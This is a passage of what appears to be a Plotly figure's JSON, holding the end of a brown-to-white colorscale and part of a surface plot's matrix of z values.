\"rgb(143, 111, 104)\"], [0.7834645669291338, \"rgb(145, 114, 107)\"], [0.7874015748031495, \"rgb(147, 116, 110)\"], [0.7913385826771654, \"rgb(149, 119, 112)\"], [0.7952755905511811, \"rgb(151, 121, 115)\"], [0.7992125984251969, \"rgb(153, 124, 118)\"], [0.8031496062992126, \"rgb(155, 127, 121)\"], [0.8070866141732284, \"rgb(157, 129, 123)\"], [0.8110236220472441, \"rgb(159, 132, 126)\"], [0.8149606299212598, \"rgb(161, 134, 129)\"], [0.8188976377952756, \"rgb(163, 137, 131)\"], [0.8228346456692913, \"rgb(165, 139, 134)\"], [0.8267716535433071, \"rgb(167, 142, 137)\"], [0.8307086614173228, \"rgb(168, 144, 139)\"], [0.8346456692913385, \"rgb(171, 147, 142)\"], [0.8385826771653543, \"rgb(173, 150, 145)\"], [0.84251968503937, \"rgb(175, 152, 147)\"], [0.8464566929133858, \"rgb(177, 155, 150)\"], [0.8503937007874016, \"rgb(179, 157, 153)\"], [0.8543307086614174, \"rgb(181, 160, 155)\"], [0.8582677165354331, \"rgb(183, 162, 158)\"], [0.8622047244094488, \"rgb(185, 165, 161)\"], [0.8661417322834646, \"rgb(187, 167, 163)\"], [0.8700787401574803, \"rgb(189, 170, 166)\"], [0.8740157480314961, \"rgb(191, 173, 169)\"], [0.8779527559055118, \"rgb(193, 175, 171)\"], [0.8818897637795275, \"rgb(195, 178, 174)\"], [0.8858267716535433, \"rgb(196, 180, 177)\"], [0.889763779527559, \"rgb(199, 183, 179)\"], [0.8937007874015748, \"rgb(200, 185, 182)\"], [0.8976377952755905, \"rgb(203, 188, 185)\"], [0.9015748031496063, \"rgb(205, 191, 187)\"], [0.905511811023622, \"rgb(207, 193, 190)\"], [0.9094488188976377, \"rgb(209, 196, 193)\"], [0.9133858267716535, \"rgb(211, 198, 196)\"], [0.9173228346456693, \"rgb(212, 201, 198)\"], [0.9212598425196851, \"rgb(215, 203, 201)\"], [0.9251968503937008, \"rgb(217, 206, 204)\"], [0.9291338582677166, \"rgb(219, 208, 206)\"], [0.9330708661417323, \"rgb(221, 211, 209)\"], [0.937007874015748, \"rgb(223, 214, 212)\"], [0.9409448818897638, \"rgb(225, 216, 214)\"], [0.9448818897637795, \"rgb(227, 219, 217)\"], [0.9488188976377953, \"rgb(228, 221, 220)\"], [0.952755905511811, \"rgb(231, 224, 222)\"], [0.9566929133858267, \"rgb(232, 226, 225)\"], [0.9606299212598425, \"rgb(235, 229, 228)\"], [0.9645669291338582, \"rgb(237, 231, 230)\"], [0.968503937007874, \"rgb(239, 234, 233)\"], [0.9724409448818897, \"rgb(241, 237, 236)\"], [0.9763779527559056, \"rgb(243, 239, 238)\"], [0.9803149606299213, \"rgb(244, 242, 241)\"], [0.984251968503937, \"rgb(247, 244, 244)\"], [0.9881889763779528, \"rgb(249, 247, 246)\"], [0.9921259842519685, \"rgb(251, 249, 249)\"], [0.9960629921259843, \"rgb(253, 252, 252)\"], [1.0, \"rgb(255, 255, 255)\"]], \"type\": \"surface\", \"z\": [[0.0, 0.026055242866277695, 0.04022997245192528, 0.05251088738441467, 0.06562713533639908, 0.07416171580553055, 0.07613785564899445, 0.08059637248516083, 0.09204737097024918, 0.09904944151639938, 0.09571556001901627, 0.09230887144804001, 0.09290139377117157, 0.09146595001220703, 0.08939267694950104, 0.0962560698390007, 0.10929950326681137, 0.11750493943691254, 0.11423718184232712, 0.10703443735837936, 0.09551643580198288, 0.08632608503103256, 0.08489466458559036, 0.08530562371015549, 0.08050071448087692, 0.0744047611951828, 0.0690612867474556, 0.06286187469959259, 0.058912649750709534, 0.060203488916158676, 0.06716547161340714, 0.07752514630556107, 0.08719723671674728, 0.09266369044780731, 0.09848224371671677, 0.09973159432411194, 0.08974117040634155, 0.07921861112117767, 0.07526501268148422, 0.06853555142879486, 0.05042384937405586, 0.03243892639875412, 0.021982721984386444, 0.021562404930591583, 0.02184644713997841, 0.019358018413186073, 0.018009694293141365, 0.018917715176939964, 0.016203826293349266, 0.0071710217744112015], [-0.026055242866277695, 0.00041995063656941056, 0.018534695729613304, 0.033445097506046295, 0.04728320240974426, 0.05552302300930023, 0.05791836977005005, 0.06340236961841583, 0.07709035277366638, 0.08659420162439346, 0.08465413749217987, 0.08181660622358322, 0.08221908658742905, 0.0811559185385704, 0.07881534844636917, 0.08500505983829498, 0.09869761019945145, 0.10812710970640182, 0.10657580941915512, 0.10018885135650635, 0.08963074535131454, 0.08001133799552917, 0.07684739679098129, 0.0775923877954483, 0.07807464152574539, 0.07532712817192078, 0.06884092837572098, 0.056512508541345596, 0.049154289066791534, 0.05141661316156387, 0.06356098502874374, 0.07632580399513245, 0.08555798977613449, 0.08968787640333176, 0.09535565972328186, 0.09766744822263718, 0.09084900468587875, 0.0821353867650032, 0.07746076583862305, 0.06890217214822769, 0.04969275742769241, 0.031678907573223114, 0.021255772560834885, 0.02168227732181549, 0.02287125401198864, 0.022497165948152542, 0.02361089177429676, 0.02651228941977024, 0.023547792807221413, 0.01201237179338932], [-0.04022997245192528, -0.015869908034801483, 0.004046501126140356, 0.019712576642632484, 0.03261580318212509, 0.040521349757909775, 0.04386133700609207, 0.04880091920495033, 0.059581458568573, 0.06904041767120361, 0.06908419728279114, 0.06646276265382767, 0.06517716497182846, 0.06472375243902206, 0.06785295158624649, 0.07763173431158066, 0.08981431275606155, 0.09899599105119705, 0.10030091553926468, 0.0955020859837532, 0.08835869282484055, 0.07892902940511703, 0.07044269144535065, 0.06452414393424988, 0.06455692648887634, 0.06589563935995102, 0.06152625381946564, 0.049651455134153366, 0.04467020183801651, 0.050881341099739075, 0.06390656530857086, 0.0730731412768364, 0.07982494682073593, 0.08497647196054459, 0.09366340935230255, 0.09745436161756516, 0.09284249693155289, 0.08321795612573624, 0.07611706107854843, 0.06796100735664368, 0.052091483026742935, 0.03445092588663101, 0.019854338839650154, 0.016779199242591858, 0.01871057040989399, 0.021064776927232742, 0.0221742931753397, 0.02369670197367668, 0.020989084616303444, 0.014235000126063824], [-0.05251088738441467, -0.03058764711022377, -0.011285792104899883, 0.004609395284205675, 0.019002307206392288, 0.032178718596696854, 0.03867889195680618, 0.04281146451830864, 0.05065733194351196, 0.05872713401913643, 0.05931653454899788, 0.05686967819929123, 0.054996322840452194, 0.05466541647911072, 0.05727364495396614, 0.06476671993732452, 0.07478645443916321, 0.08335481584072113, 0.0862041711807251, 0.08280517905950546, 0.07932732254266739, 0.07285104691982269, 0.062344953417778015, 0.0518118254840374, 0.048994023352861404, 0.05138561129570007, 0.04915580898523331, 0.04140271618962288, 0.04111795872449875, 0.05025692284107208, 0.06010529026389122, 0.06467432528734207, 0.06966067850589752, 0.07570943981409073, 0.0865691751241684, 0.09175928682088852, 0.08831390738487244, 0.07817883044481277, 0.07030585408210754, 0.06403037160634995, 0.05182028189301491, 0.03505855053663254, 0.018868986517190933, 0.013864779844880104, 0.014247607439756393, 0.013883953914046288, 0.009955392219126225, 0.008961008861660957, 0.007778535597026348, 0.00669223815202713], [-0.06405401229858398, -0.044817209243774414, -0.027011284604668617, -0.010965337976813316, 0.0048823668621480465, 0.022596590220928192, 0.03258773684501648, 0.03766319155693054, 0.045194368809461594, 0.05254266783595085, 0.05409639701247215, 0.05392224341630936, 0.05309617891907692, 0.05193905904889107, 0.05025198683142662, 0.052699875086545944, 0.06033818796277046, 0.06669150292873383, 0.06809817254543304, 0.0653107538819313, 0.06418296694755554, 0.06062855198979378, 0.05037320777773857, 0.03994768485426903, 0.03761589899659157, 0.039092980325222015, 0.03696652501821518, 0.03313480690121651, 0.03666577488183975, 0.04693559184670448, 0.05492584779858589, 0.05815713852643967, 0.062445320188999176, 0.06693002581596375, 0.07696988433599472, 0.08323665708303452, 0.08092866092920303, 0.07210227847099304, 0.06536193192005157, 0.059751369059085846, 0.048820868134498596, 0.03414951264858246, 0.020879419520497322, 0.01622115634381771, 0.012652340345084667, 0.006802916061133146, -0.001976406667381525, -0.005365060642361641, -0.006811708211898804, -0.006987688131630421], [-0.06982800364494324, -0.05501371622085571, -0.039005525410175323, -0.022734303027391434, -0.008865753188729286, 0.005019799340516329, 0.017816506326198578, 0.02805187553167343, 0.03636198863387108, 0.04204057902097702, 0.0464484840631485, 0.051559120416641235, 0.051908597350120544, 0.04821821302175522, 0.04662412777543068, 0.05111408233642578, 0.057275768369436264, 0.06022525206208229, 0.05848219245672226, 0.05558350682258606, 0.05474691092967987, 0.05105288699269295, 0.04047675430774689, 0.032897111028432846, 0.033298902213573456, 0.03078330308198929, 0.026145564392209053, 0.02768516167998314, 0.03371873497962952, 0.041262246668338776, 0.04817251116037369, 0.05385565012693405, 0.0593767873942852, 0.06171039491891861, 0.06899785995483398, 0.07557418197393417, 0.07264307141304016, 0.0656294897198677, 0.06185838580131531, 0.055663589388132095, 0.04454009607434273, 0.03427698090672493, 0.02706841565668583, 0.02047918178141117, 0.00920513179153204, -0.0017767121316865087, -0.009153984487056732, -0.013078519143164158, -0.01612836867570877, -0.017208807170391083], [-0.07487376034259796, -0.06194769963622093, -0.0446578748524189, -0.02736714854836464, -0.01546410284936428, -0.006408232729882002, 0.006767454091459513, 0.020474158227443695, 0.030412273481488228, 0.03693469613790512, 0.044539276510477066, 0.05167168751358986, 0.051050059497356415, 0.0456680990755558, 0.04429169371724129, 0.05028655752539635, 0.055899728089571, 0.060351114720106125, 0.06141602620482445, 0.059054184705019, 0.057432934641838074, 0.05229679122567177, 0.041391387581825256, 0.03459673747420311, 0.03421667218208313, 0.028589127585291862, 0.0213151928037405, 0.02179461531341076, 0.02550065517425537, 0.029105709865689278, 0.03487466275691986, 0.042029183357954025, 0.04851573705673218, 0.05191168934106827, 0.05924078822135925, 0.06591796875, 0.06254572421312332, 0.05666443333029747, 0.054978787899017334, 0.05075771361589432, 0.042294759303331375, 0.03557251766324043, 0.030137380585074425, 0.019501402974128723, 0.003550246125087142, -0.010646109469234943, -0.017964312806725502, -0.022323669865727425, -0.02534671314060688, -0.02475357986986637], [-0.08252570778131485, -0.06960310786962509, -0.05037790536880493, -0.0328536257147789, -0.02135447785258293, -0.011373178102076054, 0.002447723411023617, 0.016338756307959557, 0.027599113062024117, 0.03653140738606453, 0.046524763107299805, 0.053653497248888016, 0.05217881128191948, 0.04653428867459297, 0.04337340220808983, 0.046872250735759735, 0.05157821625471115, 0.0589129664003849, 0.06443792581558228, 0.06261268258094788, 0.0614115335047245, 0.05813004449009895, 0.04861416667699814, 0.040615227073431015, 0.03619919344782829, 0.029406076297163963, 0.021199174225330353, 0.017083575949072838, 0.016170622780919075, 0.01617451198399067, 0.01915121264755726, 0.024815231561660767, 0.03120586648583412, 0.03781111165881157, 0.0470270998775959, 0.05320964753627777, 0.04993202164769173, 0.04395344480872154, 0.04200832173228264, 0.04015279933810234, 0.03624304011464119, 0.032157786190509796, 0.02659785933792591, 0.013697154819965363, -0.003134016878902912, -0.019525840878486633, -0.02982795424759388, -0.034727007150650024, -0.03677823394536972, -0.03457352891564369], [-0.088084876537323, -0.07578612864017487, -0.05709841474890709, -0.04281802475452423, -0.03314187005162239, -0.01978868618607521, -0.004940563812851906, 0.007052809465676546, 0.018830791115760803, 0.028256600722670555, 0.03774286434054375, 0.04659680277109146, 0.048513080924749374, 0.044407956302165985, 0.043924834579229355, 0.04732906445860863, 0.04915965721011162, 0.05503341555595398, 0.06027747318148613, 0.05677381157875061, 0.055452682077884674, 0.05831094831228256, 0.054589252918958664, 0.04679505527019501, 0.03715365380048752, 0.0297465231269598, 0.02284594252705574, 0.016386089846491814, 0.01210738718509674, 0.010056216269731522, 0.011346717365086079, 0.015726514160633087, 0.022168517112731934, 0.032199420034885406, 0.04068504646420479, 0.0432627908885479, 0.04044308140873909, 0.03302258625626564, 0.026294469833374023, 0.02177022024989128, 0.02305007353425026, 0.023692192509770393, 0.020470308139920235, 0.006326741073280573, -0.011361107230186462, -0.029226820915937424, -0.03904905915260315, -0.04057116061449051, -0.041110772639513016, -0.042343754321336746], [-0.09046395868062973, -0.08029993623495102, -0.06484664231538773, -0.05441025644540787, -0.04690436273813248, -0.033600304275751114, -0.019502811133861542, -0.0087891248986125, 0.004302168730646372, 0.013561315834522247, 0.021183570846915245, 0.032534483820199966, 0.03939448669552803, 0.038264013826847076, 0.042624615132808685, 0.04829484596848488, 0.04798632860183716, 0.05137592926621437, 0.05515177547931671, 0.0507231131196022, 0.047346021980047226, 0.05102177709341049, 0.05162586644291878, 0.04786542430520058, 0.041316475719213486, 0.03510859236121178, 0.029109148308634758, 0.023041727021336555, 0.018523870036005974, 0.01687413826584816, 0.018333228304982185, 0.02202541194856167, 0.026972169056534767, 0.032238349318504333, 0.034370578825473785, 0.03323265165090561, 0.0320943146944046, 0.02529216930270195, 0.015125075355172157, 0.007106577046215534, 0.010151741094887257, 0.013506179675459862, 0.012705199420452118, -0.0009012600639835, -0.01893707551062107, -0.03631623089313507, -0.042546845972537994, -0.03971286118030548, -0.038343481719493866, -0.04207237809896469], [-0.09077435731887817, -0.08231694251298904, -0.0687052384018898, -0.05957259237766266, -0.05276624113321304, -0.041519686579704285, -0.02901371568441391, -0.018739284947514534, -0.00591065501794219, 0.0017778686014935374, 0.0072633964009583, 0.019196463748812675, 0.028874075040221214, 0.030982285737991333, 0.0375741571187973, 0.04428459331393242, 0.04408830404281616, 0.04776005446910858, 0.052792880684137344, 0.04995068535208702, 0.04597831889986992, 0.0473640002310276, 0.04890179634094238, 0.04874878749251366, 0.04780099540948868, 0.04237278550863266, 0.035111457109451294, 0.028654644265770912, 0.025043245404958725, 0.025274259969592094, 0.028360286727547646, 0.03186643496155739, 0.03472950682044029, 0.033870160579681396, 0.03086530603468418, 0.028118308633565903, 0.028084469959139824, 0.023532142862677574, 0.014101946726441383, 0.005942619871348143, 0.00784363690763712, 0.010294768959283829, 0.00926344096660614, -0.0036943024024367332, -0.021428413689136505, -0.03778437525033951, -0.04219385236501694, -0.037913620471954346, -0.035140130668878555, -0.03759804368019104], [-0.09331303089857101, -0.08199037611484528, -0.06908777356147766, -0.06161000579595566, -0.053420402109622955, -0.040489863604307175, -0.029524780809879303, -0.022714819759130478, -0.014929833821952343, -0.009060164913535118, -0.004099735990166664, 0.009030456654727459, 0.02217957004904747, 0.0285332053899765, 0.03346157446503639, 0.03910748288035393, 0.04303692281246185, 0.04606693983078003, 0.0470486581325531, 0.04664698243141174, 0.04791613295674324, 0.05116475373506546, 0.05129534751176834, 0.05082554742693901, 0.052964482456445694, 0.04828328639268875, 0.04033626616001129, 0.03302232176065445, 0.028018547222018242, 0.028673525899648666, 0.0347534604370594, 0.0381692573428154, 0.03857777640223503, 0.038226496428251266, 0.035453274846076965, 0.030527153983712196, 0.027912143617868423, 0.027193179354071617, 0.022840920835733414, 0.01616734080016613, 0.012079176492989063, 0.01026392076164484, 0.00813800748437643, -0.0002964673622045666, -0.01465329248458147, -0.027299143373966217, -0.03292121738195419, -0.03336697071790695, -0.031994741410017014, -0.03215336427092552], [-0.09325568377971649, -0.07955029606819153, -0.06902336329221725, -0.06340795755386353, -0.05293617025017738, -0.03609658405184746, -0.025217384099960327, -0.021315479651093483, -0.016835026443004608, -0.010872251354157925, -0.005701255984604359, 0.004302559420466423, 0.015898684039711952, 0.0248965285718441, 0.02947973646223545, 0.03618287667632103, 0.044713858515024185, 0.04845569282770157, 0.04693271219730377, 0.049098506569862366, 0.05606602877378464, 0.06213896721601486, 0.06041654199361801, 0.05568471550941467, 0.05329429730772972, 0.0472627654671669, 0.03995650261640549, 0.03403420001268387, 0.027598680928349495, 0.026938553899526596, 0.034497711807489395, 0.037609297782182693, 0.03688732162117958, 0.04215070605278015, 0.044202715158462524, 0.03889020159840584, 0.033213596791028976, 0.034598492085933685, 0.034789618104696274, 0.031510744243860245, 0.02451963722705841, 0.01937112770974636, 0.013122878037393093, 0.004149156156927347, -0.00791015475988388, -0.016132177785038948, -0.021536555141210556, -0.02697569690644741, -0.02858850173652172, -0.028658192604780197], [-0.09178968518972397, -0.07910966128110886, -0.07093986123800278, -0.06553258746862411, -0.05387589707970619, -0.0365971140563488, -0.025870244950056076, -0.021652625873684883, -0.014702841639518738, -0.006909339223057032, -0.0021609500981867313, 0.003290393855422735, 0.010879430919885635, 0.019992133602499962, 0.027182038873434067, 0.03716730698943138, 0.047237176448106766, 0.05389194190502167, 0.055912867188453674, 0.06002872809767723, 0.06707712262868881, 0.07131654769182205, 0.0684373676776886, 0.06143951043486595, 0.05533495917916298, 0.04790012910962105, 0.04110413044691086, 0.03692949563264847, 0.030154293403029442, 0.0279538594186306, 0.03490055724978447, 0.037893205881118774, 0.037109069526195526, 0.043422866612672806, 0.04783966392278671, 0.045311637222766876, 0.04148939624428749, 0.043578438460826874, 0.04410574212670326, 0.04312834516167641, 0.038444600999355316, 0.03341098874807358, 0.023801814764738083, 0.010455261915922165, -0.0020712774712592363, -0.008753273636102676, -0.012639804743230343, -0.019233886152505875, -0.0226029884070158, -0.023625949397683144], [-0.09297418594360352, -0.08121377229690552, -0.07260532677173615, -0.06422293931245804, -0.05140295252203941, -0.0391601026058197, -0.031003644689917564, -0.024467013776302338, -0.013530217111110687, -0.005538587458431721, -0.0017330573173239827, 0.00400075688958168, 0.011075487360358238, 0.01824997179210186, 0.02828759141266346, 0.04205707088112831, 0.05134645476937294, 0.0586298331618309, 0.06214211508631706, 0.06561016291379929, 0.07163340598344803, 0.07639895379543304, 0.07381328195333481, 0.06727400422096252, 0.06082746759057045, 0.051316238939762115, 0.04237395152449608, 0.03749625384807587, 0.03047827258706093, 0.027304403483867645, 0.035579536110162735, 0.04119955375790596, 0.04086552560329437, 0.04284040629863739, 0.04611074551939964, 0.04803871363401413, 0.04765947163105011, 0.04801969230175018, 0.046009574085474014, 0.044999729841947556, 0.04324386268854141, 0.04015640169382095, 0.03368491306900978, 0.02363380789756775, 0.012302697636187077, 0.005156318657100201, -0.0012268300633877516, -0.010765810497105122, -0.018938738852739334, -0.022702453657984734], [-0.0981902927160263, -0.0874277874827385, -0.07821350544691086, -0.06693173199892044, -0.0524975024163723, -0.041942764073610306, -0.034699197858572006, -0.027153203263878822, -0.016928918659687042, -0.011742213740944862, -0.007640343625098467, 0.003886755555868149, 0.014621039852499962, 0.018969185650348663, 0.027393288910388947, 0.04031873866915703, 0.047836776822805405, 0.055072132498025894, 0.05906321480870247, 0.06066914647817612, 0.06636039912700653, 0.07457049190998077, 0.07397085428237915, 0.07062772661447525, 0.06782622635364532, 0.05749291554093361, 0.046565864235162735, 0.041788484901189804, 0.03591140732169151, 0.0315973162651062, 0.03672797605395317, 0.04200557991862297, 0.04225054010748863, 0.04297475516796112, 0.046742603182792664, 0.05196549370884895, 0.05394848436117172, 0.05148962140083313, 0.045942049473524094, 0.04224398732185364, 0.04141828417778015, 0.041243452578783035, 0.040320802479982376, 0.03605598956346512, 0.027183255180716515, 0.02000340074300766, 0.010596687905490398, -0.0026778976898640394, -0.016613813117146492, -0.023491838946938515], [-0.0994970053434372, -0.0904337540268898, -0.08407188206911087, -0.07402196526527405, -0.05915060639381409, -0.0452658049762249, -0.0370200052857399, -0.03144196793437004, -0.024558186531066895, -0.02065381035208702, -0.014803354628384113, -0.001234514405950904, 0.009789778850972652, 0.012434323318302631, 0.017930878326296806, 0.028576979413628578, 0.03616497665643692, 0.04540769010782242, 0.05153397098183632, 0.052578628063201904, 0.05771414563059807, 0.06682367622852325, 0.06823951750993729, 0.06775781512260437, 0.0675964504480362, 0.05834248661994934, 0.04908403754234314, 0.04862910881638527, 0.04609598591923714, 0.04162457212805748, 0.04090186581015587, 0.04170173034071922, 0.04117728769779205, 0.04532008245587349, 0.05168668180704117, 0.05653401464223862, 0.05789082124829292, 0.054025888442993164, 0.04693574830889702, 0.0418706014752388, 0.04111996665596962, 0.04295094683766365, 0.04263419285416603, 0.03780593350529671, 0.03079889342188835, 0.02637338638305664, 0.018849339336156845, 0.0044267610646784306, -0.011651703156530857, -0.019625937566161156], [-0.09852036833763123, -0.09228135645389557, -0.09079599380493164, -0.08205940574407578, -0.06647083163261414, -0.05008384585380554, -0.04041314125061035, -0.03600125014781952, -0.03562293201684952, -0.03500567376613617, -0.02674918808043003, -0.012534177862107754, -0.003408940974622965, -0.0018291014712303877, 0.006128213834017515, 0.018860772252082825, 0.02579977922141552, 0.035555168986320496, 0.043626148253679276, 0.044093187898397446, 0.0454300157725811, 0.051413096487522125, 0.05582275241613388, 0.05859878286719322, 0.06078687682747841, 0.05588528513908386, 0.05065291374921799, 0.052964936941862106, 0.05545354261994362, 0.055715207010507584, 0.05136663094162941, 0.04520421847701073, 0.0418996661901474, 0.048492588102817535, 0.057535383850336075, 0.06134963408112526, 0.06132876127958298, 0.054554395377635956, 0.044839706271886826, 0.03927752748131752, 0.03859790414571762, 0.03936714306473732, 0.03965035080909729, 0.036339130252599716, 0.030069028958678246, 0.025129936635494232, 0.020747793838381767, 0.011381363496184349, -0.00042309198761358857, -0.010258080437779427], [-0.09594127535820007, -0.09131953120231628, -0.09046141058206558, -0.08054814487695694, -0.06609367579221725, -0.056757133454084396, -0.050428345799446106, -0.044992007315158844, -0.045448679476976395, -0.04476354271173477, -0.03461936116218567, -0.02055094949901104, -0.01380973681807518, -0.01275604497641325, -0.0018348883604630828, 0.012520479038357735, 0.017836369574069977, 0.025448698550462723, 0.03286908566951752, 0.03237375244498253, 0.03148316964507103, 0.037484850734472275, 0.04579710215330124, 0.050072357058525085, 0.05160228908061981, 0.0514378547668457, 0.04928349703550339, 0.04805144667625427, 0.05319232866168022, 0.06143862009048462, 0.06168163940310478, 0.0523245744407177, 0.04489817097783089, 0.047212421894073486, 0.05485576391220093, 0.058648671954870224, 0.06017712876200676, 0.05247088521718979, 0.04033380374312401, 0.034932348877191544, 0.034166622906923294, 0.0319150947034359, 0.035084061324596405, 0.037989117205142975, 0.03221726045012474, 0.02362525649368763, 0.020601950585842133, 0.01892462745308876, 0.01570400781929493, 0.006303683388978243], [-0.09207430481910706, -0.08771320432424545, -0.08497509360313416, -0.07447654753923416, -0.06248466670513153, -0.06067414581775665, -0.05854007601737976, -0.05224952846765518, -0.04826263338327408, -0.04486196115612984, -0.03539451211690903, -0.0222037211060524, -0.01619892008602619, -0.01552564837038517, -0.007823719643056393, 0.002764605451375246, 0.007405424956232309, 0.0140878576785326, 0.020192285999655724, 0.01845412515103817, 0.019418606534600258, 0.030361443758010864, 0.0409713089466095, 0.04508759081363678, 0.04494002088904381, 0.045961644500494, 0.04459834843873978, 0.040890883654356, 0.04610591381788254, 0.0572572760283947, 0.06188332661986351, 0.053840186446905136, 0.04494157433509827, 0.04353521391749382, 0.049334436655044556, 0.05425316467881203, 0.05929284170269966, 0.05420646816492081, 0.04235706105828285, 0.03687557578086853, 0.03505836799740791, 0.030884157866239548, 0.03399307280778885, 0.0386255644261837, 0.03388522192835808, 0.025632906705141068, 0.0245208702981472, 0.026608889922499657, 0.0281198862940073, 0.02220214530825615], [-0.09168050438165665, -0.08725009113550186, -0.08140534907579422, -0.07223325222730637, -0.06381628662347794, -0.06232098489999771, -0.058773789554834366, -0.052490122616291046, -0.048636216670274734, -0.04584726691246033, -0.03729429841041565, -0.02333236299455166, -0.014937303029000759, -0.01347763929516077, -0.011749236844480038, -0.006574684754014015, -0.0003280762757640332, 0.004954494535923004, 0.006421316415071487, 0.003880245378240943, 0.0068962182849645615, 0.021648524329066277, 0.03518189862370491, 0.041780985891819, 0.042571935802698135, 0.04471466317772865, 0.04456271603703499, 0.03825868293642998, 0.03940412402153015, 0.047918081283569336, 0.05416955426335335, 0.050320353358983994, 0.043129339814186096, 0.04234478995203972, 0.049074240028858185, 0.05590178817510605, 0.06312981247901917, 0.05909934267401695, 0.047757092863321304, 0.03813140466809273, 0.03359822556376457, 0.030985258519649506, 0.03369079530239105, 0.03772416710853577, 0.036059632897377014, 0.030715003609657288, 0.03007102757692337, 0.034203559160232544, 0.03764840215444565, 0.03253740444779396], [-0.09120375663042068, -0.08627336472272873, -0.0777694508433342, -0.0716853067278862, -0.06786458194255829, -0.06258704513311386, -0.05395173653960228, -0.04797634482383728, -0.0472407303750515, -0.046633560210466385, -0.0385688878595829, -0.02639753557741642, -0.01748201996088028, -0.014708307571709156, -0.015461289323866367, -0.011180618777871132, -0.0018121326575055718, 0.002764658536761999, -0.0004342917527537793, -0.0025117502082139254, -0.001198957790620625, 0.009518858045339584, 0.02524326741695404, 0.03659098222851753, 0.04037630185484886, 0.04439741373062134, 0.048558205366134644, 0.04542570188641548, 0.041690099984407425, 0.04299182444810867, 0.047237578779459, 0.0488937646150589, 0.04579191654920578, 0.04604984074831009, 0.05293915048241615, 0.06044849380850792, 0.06564400345087051, 0.05909315496683121, 0.04864329844713211, 0.036607060581445694, 0.0339164137840271, 0.037062760442495346, 0.03889015316963196, 0.03933791443705559, 0.04125852510333061, 0.03920489177107811, 0.03677574172616005, 0.041609592735767365, 0.0453401543200016, 0.03875826671719551], [-0.08562473952770233, -0.07887572795152664, -0.06875122338533401, -0.06341878324747086, -0.06278788298368454, -0.06193358823657036, -0.05472376197576523, -0.04768393933773041, -0.04253038391470909, -0.03794076293706894, -0.02925124019384384, -0.021920498460531235, -0.01778523251414299, -0.016076017171144485, -0.016781816259026527, -0.012357883155345917, -0.003930851351469755, 0.0012488483916968107, -0.0007962698000483215, -0.0022417439613491297, -0.003226857865229249, 0.0030302973464131355, 0.018571509048342705, 0.030745074152946472, 0.03440583124756813, 0.039985157549381256, 0.04861463978886604, 0.05161665380001068, 0.04760724678635597, 0.04572056606411934, 0.049300435930490494, 0.054047781974077225, 0.053488731384277344, 0.05036058649420738, 0.05271054059267044, 0.057636700570583344, 0.059985920786857605, 0.05264309048652649, 0.044487081468105316, 0.03852260857820511, 0.04391811043024063, 0.05130113288760185, 0.05186037719249725, 0.04837764427065849, 0.04970134049654007, 0.047275055199861526, 0.04341382533311844, 0.04806576296687126, 0.053017329424619675, 0.04840881749987602], [-0.07669571787118912, -0.06932738423347473, -0.061256006360054016, -0.05655977129936218, -0.05638367682695389, -0.05869641155004501, -0.05562547594308853, -0.0493277981877327, -0.03783825412392616, -0.02705148234963417, -0.01775069162249565, -0.012403417378664017, -0.010334284044802189, -0.009905995801091194, -0.010736248455941677, -0.009037443436682224, -0.004990905988961458, 0.00043712626211345196, 0.002041056053712964, 0.000649818335659802, -0.000744409509934485, 0.003820844693109393, 0.01580667309463024, 0.025167196989059448, 0.027825992554426193, 0.033011361956596375, 0.043040644377470016, 0.0530368909239769, 0.05307585746049881, 0.05087845399975777, 0.052383050322532654, 0.05731545016169548, 0.05912569910287857, 0.054139088839292526, 0.0519498735666275, 0.05284230038523674, 0.052303340286016464, 0.046679358929395676, 0.04254201054573059, 0.04636763781309128, 0.06047918274998665, 0.07007426768541336, 0.07029417902231216, 0.06368192285299301, 0.06098531186580658, 0.055162250995635986, 0.05030183121562004, 0.0535692535340786, 0.05866939574480057, 0.05583047866821289], [-0.0729847252368927, -0.06627751141786575, -0.060923002660274506, -0.055942218750715256, -0.052458181977272034, -0.05029137060046196, -0.05055646598339081, -0.048628997057676315, -0.03625908121466637, -0.022920828312635422, -0.014244960620999336, -0.005860988982021809, 0.0002927382884081453, 0.0006329523748718202, 0.0008162409067153931, -0.001356674823909998, -0.003400831250473857, 0.000570911739487201, 0.005046964623034, 0.002499207155779004, 0.0031330420169979334, 0.009684992022812366, 0.01530527975410223, 0.021380295976996422, 0.027893193066120148, 0.03172903507947922, 0.03678886592388153, 0.04699130356311798, 0.051794104278087616, 0.052282728254795074, 0.0529540479183197, 0.05714196339249611, 0.06190577521920204, 0.06224436312913895, 0.0605805367231369, 0.05793825536966324, 0.0548381544649601, 0.05283903330564499, 0.053501203656196594, 0.06164689362049103, 0.07500611990690231, 0.08310738205909729, 0.08613929152488708, 0.08094499260187149, 0.07263990491628647, 0.06173664703965187, 0.05724301189184189, 0.059183329343795776, 0.0626583844423294, 0.05811070278286934], [-0.0744047611951828, -0.06661121547222137, -0.05778292194008827, -0.05132988467812538, -0.04773930087685585, -0.04542621597647667, -0.04725547507405281, -0.04670099541544914, -0.03511865437030792, -0.021753735840320587, -0.013384822756052017, -0.004892658907920122, 0.0018393161008134484, 0.0022901413030922413, 0.004756948910653591, 0.003932665567845106, 0.0012662606313824654, 0.005272942595183849, 0.010530304163694382, 0.00753386365249753, 0.008879357017576694, 0.015481129288673401, 0.01711242087185383, 0.021632038056850433, 0.031617533415555954, 0.0358281210064888, 0.037016693502664566, 0.0413917601108551, 0.04614898934960365, 0.05020054802298546, 0.056598324328660965, 0.06380542367696762, 0.07010508328676224, 0.07445313781499863, 0.07551109790802002, 0.07358115166425705, 0.07119590789079666, 0.07133517414331436, 0.07367874681949615, 0.07811740040779114, 0.08475753664970398, 0.09061884135007858, 0.09584487974643707, 0.09367965906858444, 0.08382481336593628, 0.07081098109483719, 0.0655776634812355, 0.06586182862520218, 0.06731721013784409, 0.06077421456575394], [-0.07587684690952301, -0.06611280143260956, -0.051968950778245926, -0.04477093368768692, -0.04352341964840889, -0.042962729930877686, -0.04382461681962013, -0.04227077215909958, -0.03306322917342186, -0.021503811702132225, -0.012938950210809708, -0.0062689101323485374, -0.0008781708311289549, 0.0003584538062568754, 0.0033832434564828873, 0.0046615940518677235, 0.005580609664320946, 0.012767360545694828, 0.019537631422281265, 0.017403189092874527, 0.01878228783607483, 0.02311268262565136, 0.02186591923236847, 0.02347494661808014, 0.03254484385251999, 0.038361016660928726, 0.040484435856342316, 0.04229145869612694, 0.04571910947561264, 0.05153011158108711, 0.0618261881172657, 0.07155729085206985, 0.0787208303809166, 0.08627744764089584, 0.0906672403216362, 0.0908808633685112, 0.08989408612251282, 0.08990921080112457, 0.09168842434883118, 0.09303510189056396, 0.09555669128894806, 